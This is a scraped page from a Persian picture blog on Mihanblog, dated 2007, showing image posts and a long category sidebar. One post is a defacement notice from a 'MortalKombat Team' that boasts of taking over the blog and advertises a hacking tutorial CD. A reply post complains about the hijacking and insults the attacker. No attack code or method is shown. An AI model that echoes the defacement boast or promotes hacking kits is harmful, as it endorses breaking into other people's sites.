                  <p>&nbsp; <div id="InPost_MihanblogShopAds" style="display:block;height:0px;width:100%;border:0px"></div><p align="center"><strong>سلام</strong></p><p align="center"><strong>دوستان این وبلاگ هک شده منم آشنای صاحب قبلی این وبلاگ هستم</strong></p><p align="center"><strong>این نامرد راندی این وبلاگ هک کرده</strong></p><p align="center"><strong>برای منم یه یوزر الكی ساخته كه توش فعالیت كنم</strong></p><p align="center"><strong>در جوابش فقط میتونم بگم</strong></p><p align="center"><strong>نامردم این وبلاگ ازت پس نگیرم من به مدیریت میهن بلاگ اطلاع میدم</strong></p><p align="center"><strong>تا بفهمی با کی طرفی</strong></p><p align="center"><strong>آیدی منم</strong></p><p align="center"><strong>bahar_shop هستش</strong></p><p align="center"><strong>اگه خیلی ادعات میشه برو سایت گروه آشیانه رو هم كن</strong></p><p align="center"><strong>تا بهروز كمالیان مخ هك ایران ننت بیاره جلو چشات</strong></p><p align="center"><strong>فكر كردی فقط خودت بلدی هك كنی</strong></p><p align="center"><strong>منم بلدم اما مثل تو نامرد نیستم كه وبلاگ هك كنم</strong></p><p align="center" /></p>
					<p align="center"></p>
					<BR>&nbsp;نوشته شده توسط جواد در جمعه 23 شهریور 1386 و ساعت 10:09 ق.ظ </FONT></p>
                  <P></P>
                  <P dir=rtl><A class=links 
                  href="http://monline.mihanblog.com/?ArticleId=2">&nbsp;</A><FONT 
                  face=Wingdings><a href="/post/2123">لینک ثابت</a></FONT> <FONT color=#cc0000>
					|</FONT>
					<a href="javascript:newComment(2123)"><span lang="fa">یك هدیه به من میدی</span> 
					<script>setCommentCnt(2123)</script></span></a></P></TD></TR></TBODY></TABLE><BR>      
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                bgColor=#8cb6e7 height=20 ? >
                  &nbsp;<a href="/post/2122" target="_blank" style="font-family: Tahoma; font-size: 11; text-decoration: none; font-weight: 700">هک شد</a></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
                  <FONT color=#000000>
                  <p>&nbsp; <p class="MsoNormal" style="MARGIN: 0cm 0cm 0pt"><b><span style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">This Web Hacked By MortalKombat Team<p /></span></b></p><p class="MsoNormal" style="MARGIN: 0cm 0cm 0pt"><b><span style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">My ID : R4ndyKiller<p /></span></b></p><p class="MsoNormal" style="MARGIN: 0cm 0cm 0pt"><b><span lang="FA" dir="rtl" style="FONT-SIZE: 10pt; FONT-FAMILY: Arial; mso-bidi-language: FA"><p> </p></span></b></p><p class="MsoNormal" style="MARGIN: 0cm 0cm 0pt; tab-stops: 36.0pt; mso-layout-grid-align: none"><b><span lang="AR-SA" dir="rtl" style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">مجموعه سی دی هک</span></b><b><span lang="FA" dir="rtl" style="FONT-SIZE: 10pt; FONT-FAMILY: Arial; mso-bidi-language: FA"> آماده شد</span></b><b><span style="FONT-SIZE: 10pt; FONT-FAMILY: Arial; mso-bidi-language: FA"><p /></span></b></p><p class="MsoNormal" style="MARGIN: 0cm 0cm 0pt; tab-stops: 36.0pt; mso-layout-grid-align: none"><b><span lang="FA" dir="rtl" style="FONT-SIZE: 10pt; FONT-FAMILY: Arial; mso-bidi-language: FA">بهترین آموزشها و برنامه های هک</span></b><b><span style="FONT-SIZE: 10pt; FONT-FAMILY: Arial; mso-bidi-language: FA"><p /></span></b></p><p class="MsoNormal" style="MARGIN: 0cm 0cm 0pt; tab-stops: 36.0pt; mso-layout-grid-align: none"><b><span lang="FA" dir="rtl" style="FONT-SIZE: 10pt; FONT-FAMILY: Arial; mso-bidi-language: FA">یک هکر حرفه ای شوید<p /></span></b></p><p class="MsoNormal" style="MARGIN: 0cm 0cm 0pt; tab-stops: 36.0pt; mso-layout-grid-align: none"><b><span style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Arial; mso-bidi-language: FA"><a href="http://www.americanhacker.mihanblog.com/">www.AmericanHacker.MihanBlog.com</a><p /></span></b></p><p class="MsoNormal" style="MARGIN: 0cm 0cm 0pt; tab-stops: 36.0pt; mso-layout-grid-align: none"><b><span style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Arial; mso-bidi-language: FA"><a href="http://www.hacker.mihanblog.com/">www.Hacker.Mihanblog.com</a><p /></span></b></p><p class="MsoNormal" style="MARGIN: 0cm 0cm 0pt"><b><span style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Arial">mohsen_britney000<p /></span></b></p></p>
					<p align="center"></p>
					<BR>&nbsp;نوشته شده توسط جواد ساریخانی  در چهارشنبه 21 شهریور 1386 و ساعت 06:09 ق.ظ </FONT></p>
                  <P></P>
                  <P dir=rtl><A class=links 
                  href="http://monline.mihanblog.com/?ArticleId=2">&nbsp;</A><FONT 
                  face=Wingdings><a href="/post/2122">لینک ثابت</a></FONT> <FONT color=#cc0000>
					|</FONT>
					<a href="javascript:newComment(2122)"><span lang="fa">یك هدیه به من میدی</span> 
					<script>setCommentCnt(2122)</script></span></a></P></TD></TR></TBODY></TABLE><BR>      
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                bgColor=#8cb6e7 height=20 ? >
                  &nbsp;<a href="/post/2121" target="_blank" style="font-family: Tahoma; font-size: 11; text-decoration: none; font-weight: 700">تفکر</a></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
                  <FONT color=#000000>
                  <p>&nbsp; <p align="center"><img title="تفکر" alt="تفکر" src="http://www.cloob.com/public/public/user_data/album_photo/177/530601-b.jpg" border="0" /></p></p>
					<p align="center"></p>
					<BR>&nbsp;نوشته شده توسط جواد ساریخانی  در چهارشنبه 21 شهریور 1386 و ساعت 03:09 ق.ظ </FONT></p>
                  <P></P>
                  <P dir=rtl><A class=links 
                  href="http://monline.mihanblog.com/?ArticleId=2">&nbsp;</A><FONT 
                  face=Wingdings><a href="/post/2121">لینک ثابت</a></FONT> <FONT color=#cc0000>
					|</FONT>
					<a href="javascript:newComment(2121)"><span lang="fa">یك هدیه به من میدی</span> 
					<script>setCommentCnt(2121)</script></span></a></P></TD></TR></TBODY></TABLE><BR>      
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                bgColor=#8cb6e7 height=20 ? >
                  &nbsp;<a href="/post/2120" target="_blank" style="font-family: Tahoma; font-size: 11; text-decoration: none; font-weight: 700">........</a></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
                  <FONT color=#000000>
                  <p>&nbsp; <p align="center"><img title="......." alt="......." src="http://www.cloob.com/public/public/user_data/album_photo/182/543786-b.jpg" border="0" /></p></p>
					<p align="center"></p>
					<BR>&nbsp;نوشته شده توسط جواد ساریخانی  در چهارشنبه 21 شهریور 1386 و ساعت 03:09 ق.ظ </FONT></p>
                  <P></P>
                  <P dir=rtl><A class=links 
                  href="http://monline.mihanblog.com/?ArticleId=2">&nbsp;</A><FONT 
                  face=Wingdings><a href="/post/2120">لینک ثابت</a></FONT> <FONT color=#cc0000>
					|</FONT>
					<a href="javascript:newComment(2120)"><span lang="fa">یك هدیه به من میدی</span> 
					<script>setCommentCnt(2120)</script></span></a></P></TD></TR></TBODY></TABLE><BR>      
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                bgColor=#8cb6e7 height=20 ? >
                  &nbsp;<a href="/post/2119" target="_blank" style="font-family: Tahoma; font-size: 11; text-decoration: none; font-weight: 700">طبیعت</a></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
                  <FONT color=#000000>
                  <p>&nbsp; <p align="center"><img title="طبیعت" style="WIDTH: 408px; HEIGHT: 258px" height="258" alt="طبیعت" src="http://www.cloob.com/public/public/user_data/album_photo/183/546963-b.jpg" width="408" border="0" /></p></p>
					<p align="center"></p>
					<BR>&nbsp;نوشته شده توسط جواد ساریخانی  در چهارشنبه 21 شهریور 1386 و ساعت 03:09 ق.ظ </FONT></p>
                  <P></P>
                  <P dir=rtl><A class=links 
                  href="http://monline.mihanblog.com/?ArticleId=2">&nbsp;</A><FONT 
                  face=Wingdings><a href="/post/2119">لینک ثابت</a></FONT> <FONT color=#cc0000>
					|</FONT>
					<a href="javascript:newComment(2119)"><span lang="fa">یك هدیه به من میدی</span> 
					<script>setCommentCnt(2119)</script></span></a></P></TD></TR></TBODY></TABLE><BR>			&nbsp;<TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
                  <P align=center><FONT 
                  style="FONT-SIZE: 8pt; FONT-FAMILY: Tahoma, Verdana,Helvetica" 
                  face=Tahoma color=#000000><SPAN lang=fa 
                  style="FONT-SIZE: 8pt">&nbsp; </SPAN></FONT></P>
<p align="center"><font style="font-size: 8pt"><span lang="en-us">All Rights 
Reserved 2005-2006 © picdata.Mihanblog.Com</span></font><p align="center">This 
					Template Designed By <a href="http://www.dlisland.com"><span lang="en-us">
					Ali Mohajer</span></a>
					<span lang="en-us">@ Www.Dlisland.Com</span><P align=center><SPAN lang=en-us 
                  style="FONT-SIZE: 8pt">&nbsp;Resolution: 1024 * 768</SPAN></P>
                  <P align=center><font size="2"><a href="/post/rss/"><img border="0" src="/public/public/mihan_files/files/rss.gif"/></a> <a href="/post/atom/"><img border="0" src="/public/public/mihan_files/files/atom.png"/></a></font></P>
                  
                  <P align=center>&nbsp;</P></TD></TR></TBODY></TABLE></TD>
          <TD dir=rtl vAlign=top width=200 
          background="http://www.dlisland.persiangig.com/Theme/Ice/link_fill.gif" 
          bgColor=#f5f5f5>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                height=20 bgcolor="#8CB6E7">
                  <P align=center><B><SPAN lang=fa><FONT color=#333333>منوی اصلی</FONT></SPAN></B></P></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
<span style="FONT-SIZE: 8pt">
<p>
<img src="http://www.dlisland.persiangig.com/Theme/Ice/DLisland-Link.png" width="13" height="9"><font color="#ff0000">

</font><font style="font-size: 8pt"><span lang="en-us">&nbsp;</span></font><span style="font-size: 9pt"><a class="links" title="My Email" target="_blank" href="mailto:javad_jj6000@yahoo.com">ایمیل 
ما</a>&nbsp;</span></p>
<p>
<img src="http://www.dlisland.persiangig.com/Theme/Ice/DLisland-Link.png" width="13" height="9"><font style="font-size: 8pt">&nbsp;
</font>
<a class="links" title=" Send Latter To Admin " href="javascript:messageForm()">ارتباط&nbsp; با 
ما</a></p>
<p>
<img src="http://www.dlisland.persiangig.com/Theme/Ice/DLisland-Link.png" width="13" height="9">&nbsp; <span style="font-size: 9pt">
<a class="links" title="Home" href="http://http://www.picdata.mihanblog.com">صفحه نخست</a></span></p>
<p>
<img src="http://www.dlisland.persiangig.com/Theme/Ice/DLisland-Link.png" width="13" height="9"> <font style="font-size: 8pt"><span lang="en-us">
&nbsp;</span></font><a onClick="javascript:this.style.behavior='url(#default#homepage)';this.setHomePage('http://http://www.picdata.mihanblog.com')" ; href="javascript:" style="text-decoration: none">تبدیل 
به صفحه خانگی</a></p>
<p>
<img src="http://www.dlisland.persiangig.com/Theme/Ice/DLisland-Link.png" width="13" height="9">&nbsp; 
<a title="برای مشاهده قالب های دیگر كلیك كنید" target="_blank" href="http://www.dlisland.com" style="text-decoration: none">
طراح قالب وبلاگ</a></p>
<p>
&nbsp;</p>
</span>
                  </TD></TR></TBODY></TABLE>
            <P><BR></P>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                height=20 bgcolor="#8CB6E7">
                  <P dir=rtl align=center><SPAN lang=fa><FONT 
                  color=#333333><B>نویسنده</B></FONT></SPAN></P></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
				<p align="right"><img src="http://www.dlisland.persiangig.com/Theme/Ice/DLisland-Link.png" width="13" height="9">
				<a href="/post/author/1">
				جواد ساریخانی  <font color="#FF0000">(</font>1995<font color="#FF0000">)</font></a><img src="http://www.dlisland.persiangig.com/Theme/Ice/DLisland-Link.png" width="13" height="9">
				<a href="/post/author/2">
				جواد <font color="#FF0000">(</font>1<font color="#FF0000">)</font></a><p align="right">
				
<br></TD></TR></TBODY></TABLE>
            <P><BR></P>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 align=middle width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                height=20 bgcolor="#8CB6E7"><B><SPAN lang=fa><FONT 
                  color=#333333>موضوعات</FONT></SPAN></B></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
				<img border="0" src="http://i18.tinypic.com/66b6urs.jpg" width="19" height="18"><span lang="fa"> 
				گالری عكس:</span><p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/5.aspx">شعر 
				و عكس</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">
				<a href="http://picdata.mihanblog.com/Cat/3.aspx">حیرت انگیز</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/2.aspx">خنده 
				دار</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/16.aspx">عاشقانه</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/41.aspx">طبیعت</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/48.aspx">حوادث</a></span></p>
				<p>
				<img border="0" src="http://i18.tinypic.com/66b6urs.jpg" width="19" height="18"><span lang="fa"> 
				تصاویر بازیگران:</span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/58.aspx">گلشیفته 
				فرهانی</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/46.aspx">بهنوش 
				بختیاری</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">
				<a href="http://picdata.mihanblog.com/Cat/50.aspx">محمد رضا 
				گلزار</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/64.aspx">مهدی 
				سلوكی</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14"></span>&nbsp;<span lang="fa"><a href="http://picdata.mihanblog.com/Cat/59.aspx">حمید 
				گودرزی</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/21.aspx">هدیه 
				تهرانی</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14"><a href="http://picdata.mihanblog.com/Cat/45.aspx">&nbsp;شیلا 
				خداداد</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/47.aspx">مهناز 
				افشار </a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/53.aspx">امین 
				حیایی</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/44.aspx">زیبا 
				بروفه</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/39.aspx">یانگوم</a>
				</span></p>
				<p>
				<img border="0" src="http://i18.tinypic.com/66b6urs.jpg" width="19" height="18"><span lang="fa"> 
				تصاویر خوانندگان:</span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/52.aspx">كامران 
				و هومن</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14"></span><a href="http://picdata.mihanblog.com/Cat/63.aspx">&nbsp;<span lang="fa">شادمهر</span></a></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/51.aspx">بنیامین</a>
				</span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/54.aspx">نانسی</a></span></p>
				<p>
				<img border="0" src="http://i18.tinypic.com/66b6urs.jpg" width="19" height="18"><span lang="fa">مبایل:</span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14"><a href="http://picdata.mihanblog.com/Cat/23.aspx">&nbsp;اس 
				ام اس سركاری</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14"><a href="http://picdata.mihanblog.com/Cat/24.aspx">&nbsp;اس 
				ام اس مخلوط </a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14"><a href="http://picdata.mihanblog.com/Cat/13.aspx">&nbsp;اس 
				ام اس جالب </a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14"><a href="http://picdata.mihanblog.com/Cat/22.aspx">&nbsp;اس 
				ام اس طنز</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/43.aspx">بازی 
				های ناز</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/12.aspx">آهنگ</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/8.aspx">كلیپ</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14"><a href="http://picdata.mihanblog.com/Cat/42.aspx">&nbsp;تم </a>
				</span></p>
				<p>
				<img border="0" src="http://i18.tinypic.com/66b6urs.jpg" width="19" height="18"><span lang="fa">مذهبی:</span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14"><a href="http://javadhacktools2006.mihanblog.com/Cat/10.aspx">&nbsp;آشنایی 
				با حضرت زهرا (س)</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">
				<a href="http://picdata.mihanblog.com/Cat/19.aspx">سخنان خدایی</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/25.aspx">جبهه 
				و جنگ</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/57.aspx">روز 
				جانباز</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/20.aspx">نوحه</a></span></p>
				<p>
				<img border="0" src="http://i18.tinypic.com/66b6urs.jpg" width="19" height="18"><span lang="fa">ورزشی:</span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">
				<a href="http://picdata.mihanblog.com/Cat/62.aspx">پرسپلیس</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/60.aspx">رونالدینیو</a></span></p>
				<p>
				<img border="0" src="http://i18.tinypic.com/66b6urs.jpg" width="19" height="18"><span lang="fa">دانلود:</span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/61.aspx">قالب 
				وبلاگ</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14"><a href="http://picdata.mihanblog.com/Cat/55.aspx">&nbsp;نرم 
				افزار</a> </span></p>
				<p>
				<img border="0" src="http://i18.tinypic.com/66b6urs.jpg" width="19" height="18"><span lang="fa">عمومی:</span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/66.aspx">مطالب 
				جالب و زیبا</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">
				<a href="http://picdata.mihanblog.com/Cat/15.aspx">جملات عاشقانه</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/6.aspx">فكاهی 
				و خنده</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14"><a href="http://picdata.mihanblog.com/Cat/11.aspx">&nbsp;فالنامه</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/9.aspx">حكایت</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14"><a href="http://picdata.mihanblog.com/Cat/17.aspx">&nbsp;با 
				مزه</a></span></p>
				<p><span lang="fa">
				<img border="0" src="http://i5.tinypic.com/54ipbb7.jpg" width="12" height="14">&nbsp;<a href="http://picdata.mihanblog.com/Cat/4.aspx">شعر</a>
				</span><br>
				</TD></TR></TBODY></TABLE>
            <P><BR></P>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 align=middle width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                height=20 bgcolor="#8CB6E7">
                  <P><B><SPAN lang=fa><FONT 
                  color=#333333>آرشیو</FONT></SPAN></B></P></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
				<p align="right"><img src="http://www.dlisland.persiangig.com/Theme/Ice/DLisland-Link.png" width="13" height="9"><font style="font-size: 8pt"> <a href="/post/archive/1386/6">
				 شهریور 1386 
<font color="#FF0000">(</font>1216<font color="#FF0000">)</font></a></font><font style="font-size: 9pt"><Br>
                 </font><img src="http://www.dlisland.persiangig.com/Theme/Ice/DLisland-Link.png" width="13" height="9"><font style="font-size: 8pt"> <a href="/post/archive/1386/5">
				 مرداد 1386 
<font color="#FF0000">(</font>704<font color="#FF0000">)</font></a></font><font style="font-size: 9pt"><Br>
                 </font><img src="http://www.dlisland.persiangig.com/Theme/Ice/DLisland-Link.png" width="13" height="9"><font style="font-size: 8pt"> <a href="/post/archive/1386/4">
				 تیر 1386 
<font color="#FF0000">(</font>76<font color="#FF0000">)</font></a></font><font style="font-size: 9pt"><Br>
                 </font><BR></TD></TR></TBODY></TABLE>
            <p align="right">&nbsp;</p>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                height=20 bgcolor="#BBD3F0">
                  <P align=center><B><SPAN lang=fa><FONT 
                  color=#333333>لینکدونی</FONT></SPAN></B></P></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
				<p align="center">&nbsp;</p>
				<p align="center"><span class="Span">
				<marquee dir="ltr" onmouseover="this.stop();" style="FONT-FAMILY: Tahoma; TEXT-ALIGN: right" onmouseout="this.start();" scrollAmount="1" scrollDelay="4" direction="up" width="173" height="137" align="right"><center><a target="_blank" title="" href="http://javadhacktools2006.mihanblog.com">جدیدترین عکسهای بازیگران  <font color="#834638">- کلیک</font></a><br><a target="_blank" title="" href="Http://javadhacktools2006.mihanblog.com">بزرگترین سایت عکس <font color="#834638">- کلیک</font></a><br><a target="_blank" title="" href="http://picdata.mihanblog.com/Cat/12.aspx">موزیکال <font color="#834638">- کلیک</font></a><br><a target="_blank" title="" href="http://picdata.mihanblog.com/Cat/62.aspx">بزرگترین سایت پرسپلیس <font color="#834638">- کلیک</font></a><br><a target="_blank" title="" href="http://picdata.mihanblog.com/Cat/25.aspx">هر جور عکس مذهبی بخای هست <font color="#834638">- کلیک</font></a><br><a target="_blank" title="" href="http://picdata.mihanblog.com/">عکسهای تمامی بازیگر و خواننده ها <font color="#834638">- کلیک</font></a><br><a target="_blank" title="" href="http://picdata.mihanblog.com/Cat/8.aspx">زیبا ترین کلیپ های مبایل <font color="#834638">- کلیک</font></a><br><a target="_blank" title="" href="http://picdata.mihanblog.com/Cat/16.aspx">عاشقانه ترین عکسها در دنیا <font color="#834638">- کلیک</font></a><br><a target="_blank" title="" href="http://picdata.mihanblog.com/Cat/2.aspx">عکسهای خنده دار  خنده دار  خنده دار <font color="#834638">- کلیک</font></a><br><a target="_blank" title="" href="http://hamechilog.mihanblog.com/">عكس ها و فیلم های با حال  <font color="#834638">- کلیک</font></a><br><a href="javascript:void(0)">آرشیو لینكدونی</a></center></marquee></span></p>
				<p align="center">
				</p>
                  <P></P></TD></TR></TBODY></TABLE>
            <P><BR></P>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 align=middle width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                height=20 bgcolor="#8CB6E7"><B><SPAN lang=fa><FONT color=#333333>
				جست و جو</FONT></SPAN></B></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
                  <P align=center>
                  <form id="frm-13193441264ea397fe82018" method="get" action="http://www.picdata.mihanblog.com/post/search/fid/13193441264ea397fe82018"  onsubmit="window.open('', 'search', 'toolbar=0,location=0,status=0,menubar=0,scrollbars=1,resizable=0,width=400,height=310')" target="search"> <input class="SearchBox" type="text" name="search_text"> <input class="SearchBtn" type="submit" value="بگرد"><input type="hidden" name="frm-id" value="13193441264ea397fe82018" id="frm-id" /></form></P></TD></TR></TBODY></TABLE>
            <P align="center"><BR></P>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" 
